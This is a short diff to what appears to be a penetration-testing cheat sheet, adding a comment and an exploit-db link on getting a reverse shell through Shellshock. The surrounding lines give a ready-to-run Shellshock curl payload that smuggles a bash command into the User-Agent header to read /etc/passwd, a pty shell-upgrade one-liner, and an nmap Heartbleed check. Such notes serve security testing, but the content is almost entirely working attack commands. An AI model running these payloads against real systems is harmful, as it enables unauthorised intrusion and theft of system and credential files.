@@ -16,6 +16,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # shellshock with cgi 
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
+#to get reverse shell with shellshock
+https://exploit-db.com/exploits/34900/
 
 # heartbleed check
 nmap -sV -script=ssl-heartbleed [host]
